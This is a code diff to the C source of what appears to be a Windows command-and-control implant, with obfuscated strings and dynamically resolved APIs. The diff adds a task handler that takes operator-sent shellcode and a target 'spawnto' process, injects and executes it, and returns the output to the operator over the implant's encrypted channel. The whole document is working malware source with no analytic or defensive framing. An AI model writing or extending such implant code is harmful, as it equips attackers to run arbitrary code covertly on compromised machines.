@@ -3,6 +3,7 @@
 #include <bcrypt.h>
 #include <string.h>
 #include <stdint.h>
+#include <stdio.h>
 #include "config.h"
 #include "protocol.h"
 #include "crypto.h"
@@ -13,6 +14,7 @@
 #include "obf_strings.h"
 #include "dynapi.h"
 #include "transfer.h"
+#include "assembly.h"
 #include "session.h"
 #include "shell.h"
 
@@ -270,6 +272,40 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                         }
                         else if (hdr.type == TASK_SHELL_STOP) {
                             shell_stop();
+                        }
+                        else if (hdr.type == TASK_EXEC_ASSEMBLY && task_data && task_data_len >= 8) {
+                            uint32_t sc_len = (uint32_t)task_data[0]
+                                | ((uint32_t)task_data[1] << 8)
+                                | ((uint32_t)task_data[2] << 16)
+                                | ((uint32_t)task_data[3] << 24);
+                            const uint8_t *sc = task_data + 4;
+                            if (4 + sc_len + 4 <= task_data_len) {
+                                uint32_t sp_off = 4 + sc_len;
+                                uint32_t sp_len = (uint32_t)task_data[sp_off]
+                                    | ((uint32_t)task_data[sp_off+1] << 8)
+                                    | ((uint32_t)task_data[sp_off+2] << 16)
+                                    | ((uint32_t)task_data[sp_off+3] << 24);
+                                char spawnto_a[MAX_PATH] = {0};
+                                if (sp_len > 0 && sp_len < MAX_PATH && sp_off + 4 + sp_len <= task_data_len) {
+                                    memcpy(spawnto_a, task_data + sp_off + 4, sp_len);
+                                } else {
+                                    char _def[ENC_EXEC_ASM_SPAWNTO_LEN + 1];
+                                    xor_dec(_def, ENC_EXEC_ASM_SPAWNTO, ENC_EXEC_ASM_SPAWNTO_LEN);
+                                    _snprintf(spawnto_a, sizeof(spawnto_a) - 1, "%s", _def);
+                                }
+                                wchar_t spawnto_w[MAX_PATH] = {0};
+                                fnMultiByteToWideChar(65001 /*CP_UTF8*/, 0, spawnto_a, -1, spawnto_w, MAX_PATH);
+
+                                char output[EXEC_ASM_MAX_OUTPUT] = {0};
+                                exec_assembly(sc, sc_len, spawnto_w, output, sizeof(output));
+                                send_result(meta.id, hdr.label, FLAG_NONE,
+                                            output, meta.session_key);
+                            } else {
+                                char _me[ENC_EXEC_ASM_ERR_INJECT_LEN + 1];
+                                xor_dec(_me, ENC_EXEC_ASM_ERR_INJECT, ENC_EXEC_ASM_ERR_INJECT_LEN);
+                                send_result(meta.id, hdr.label, FLAG_ERROR,
+                                            _me, meta.session_key);
+                            }
                         }
                         else if (hdr.type == TASK_EXIT) {
                             fnExitProcess(0);
